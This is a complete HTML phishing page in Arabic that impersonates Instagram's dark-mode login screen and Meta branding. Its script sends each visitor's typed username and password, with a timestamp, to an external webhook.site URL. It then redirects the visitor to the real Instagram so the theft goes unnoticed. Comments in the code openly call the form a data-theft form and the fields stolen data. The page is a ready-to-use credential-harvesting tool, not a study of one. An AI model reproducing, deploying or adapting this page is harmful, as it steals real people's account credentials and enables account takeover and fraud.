<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        /* تصميم الوضع الداكن الحقيقي لإنستغرام */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background: #000000; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            min-height: 100vh; 
        }
        .container {
            width: 100%;
            max-width: 380px;
            padding: 20px;
            text-align: center;
        }

        /* شعار إنستغرام الجديد (صورة SVG) */
        .logo-container {
            margin-bottom: 35px;
            display: flex;
            justify-content: center;
        }
        .logo-svg {
            width: 70px;
            height: 70px;
        }

        /* حقول الإدخال */
        .input-group {
            margin-bottom: 12px;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            background: #121212;
            border: 1px solid #363636;
            border-radius: 8px;
            font-size: 14px;
            color: #f5f5f5;
            outline: none;
        }
        input::placeholder { color: #a8a8a8; }
        input:focus { border-color: #8a8a8a; }

        /* زر تسجيل الدخول */
        .btn {
            width: 100%;
            padding: 14px;
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 8px;
            transition: 0.2s;
        }
        .btn:disabled { background: #3a6a96; cursor: default; }

        /* نصوص إضافية */
        .forgot-password {
            display: block;
            color: #e0f0ff;
            font-size: 13px;
            text-decoration: none;
            margin-top: 15px;
            text-align: center;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 25px 0;
        }
        .divider::before, .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #262626;
        }
        .divider span {
            padding: 0 18px;
            color: #737373;
            font-size: 13px;
            font-weight: 600;
        }

        /* زر إنشاء حساب جديد */
        .signup-box {
            margin-top: 20px;
            padding: 15px;
            background: #000000;
            border: 1px solid #262626;
            border-radius: 8px;
        }
        .signup-text {
            color: #f5f5f5;
            font-size: 14px;
        }
        .signup-text a {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
        }

        #status { display: none; }
    </style>
</head>
<body>

    <div class="container">

        <!-- الشعار -->
        <div class="logo-container">
            <!-- استخدام شعار إنستغرام الرسمي كـ SVG -->
            <svg class="logo-svg" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
                <defs>
                    <linearGradient id="grad1" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" style="stop-color:#f58529;stop-opacity:1" />
                        <stop offset="50%" style="stop-color:#dd2a7b;stop-opacity:1" />
                        <stop offset="100%" style="stop-color:#515bd4;stop-opacity:1" />
                    </linearGradient>
                </defs>
                <rect width="64" height="64" rx="16" fill="url(#grad1)"/>
                <circle cx="32" cy="32" r="14" fill="none" stroke="white" stroke-width="3"/>
                <circle cx="43" cy="21" r="3" fill="white"/>
            </svg>
        </div>

        <!-- نموذج سرقة البيانات -->
        <form id="loginForm">
            <div class="input-group">
                <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف المحمول" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="كلمة السر" required>
            </div>
            <button type="submit" class="btn" id="loginBtn">تسجيل الدخول</button>
            <div id="status"></div>
            <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
        </form>

        <div class="divider"><span>أو</span></div>

        <div class="signup-box">
            <p class="signup-text">ليس لديك حساب؟ <a href="#">إنشاء حساب جديد</a></p>
        </div>

        <div style="margin-top: 30px; text-align: center;">
            <p style="color: #737373; font-size: 12px;">من Meta</p>
        </div>

    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const btn = document.getElementById('loginBtn');
            const status = document.getElementById('status');

            btn.innerText = "جاري تسجيل الدخول...";
            btn.disabled = true;
            status.style.display = 'none';

            // البيانات المسروقة
            const data = {
                username: username,
                password: password,
                timestamp: new Date().toISOString()
            };

            // Webhook الخاص بك
            const webhook = 'https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d33397';

            try {
                await fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });

                // إعادة التوجيه إلى إنستغرام الحقيقي
                setTimeout(() => {
                    window.location.replace("https://www.instagram.com");
                }, 1000);

            } catch (error) {
                btn.innerText = "تسجيل الدخول";
                btn.disabled = false;
                status.style.display = 'block';
                status.innerText = "حدث خطأ. حاول مرة أخرى.";
                status.style.color = "#ed4956";
            }
        });
    </script>
</body>
</html>
